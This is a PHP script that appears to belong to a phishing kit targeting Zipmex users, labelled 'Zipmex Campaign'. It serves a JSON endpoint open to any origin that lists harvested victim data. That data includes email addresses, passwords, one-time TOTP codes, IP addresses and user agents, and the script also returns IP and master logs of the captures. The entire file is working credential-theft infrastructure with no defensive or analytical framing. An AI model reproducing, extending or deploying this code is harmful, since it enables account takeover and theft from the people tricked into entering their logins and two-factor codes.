<?php
/**
 * Zipmex Campaign - List captured credentials
 * GET ?type=captures (default) - lists all credential captures
 * GET ?type=ip - returns IP log
 * GET ?type=master - returns master log
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$logDir = __DIR__ . '/logs';
$dataDir = $logDir . '/captures';

$type = $_GET['type'] ?? 'captures';

switch ($type) {
    case 'ip':
        $ipFile = $logDir . '/ip_log.txt';
        $log = file_exists($ipFile) ? htmlspecialchars(file_get_contents($ipFile)) : '';
        $lines = explode("\n", trim($log));
        $lines = array_reverse(array_filter($lines));
        echo json_encode(['log' => implode("<br>", $lines)]);
        break;
        
    case 'master':
        $masterFile = $dataDir . '/master_log.txt';
        $log = file_exists($masterFile) ? htmlspecialchars(file_get_contents($masterFile)) : '';
        $lines = explode("\n", trim($log));
        $lines = array_reverse(array_filter($lines));
        echo json_encode(['log' => implode("<br>", $lines)]);
        break;
        
    default:
        $captures = [];
        if (is_dir($dataDir)) {
            $files = glob($dataDir . '/capture_*.json');
            rsort($files);
            foreach ($files as $file) {
                $content = file_get_contents($file);
                $data = json_decode($content, true);
                if ($data) {
                    $captures[] = [
                        'email' => $data['email'] ?? 'N/A',
                        'password' => $data['password'] ?? '-',
                        'totp' => $data['totp'] ?? '-',
                        'type' => $data['type'] ?? 'unknown',
                        'ip' => $data['ip'] ?? 'N/A',
                        'timestamp' => $data['timestamp'] ?? 'N/A',
                        'userAgent' => $data['user_agent'] ?? '',
                        'file' => basename($file)
                    ];
                }
            }
        }
        echo json_encode($captures);
}
